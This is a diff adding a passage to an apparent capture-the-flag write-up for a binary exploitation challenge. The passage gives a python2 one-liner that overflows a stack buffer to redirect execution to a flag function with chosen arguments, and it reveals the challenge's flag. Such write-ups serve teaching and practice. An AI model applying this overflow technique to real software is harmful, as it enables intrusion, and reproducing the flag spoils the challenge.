@@ -58,6 +58,18 @@ cat shellcode-raw > payload
 python2 -c "print('BBBBCCC' + '\x70\xcf\xff\xff');" >> payload
 ```
 
+After a long while, I figured out it isn't about shellcoding. It's asking the EIP to jump to the flag function and modify it's two arguments.
+
+```py
+python2 -c "print('A'*188 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')"
+```
+
+Have a look:
+
+!(Stack structure)[./images/stack-frame-structure.png]
+
+Flag: HTB{0ur_Buff3r_1s_not_healthy}
+
 ## Web
 
 ### Emdee five for life 
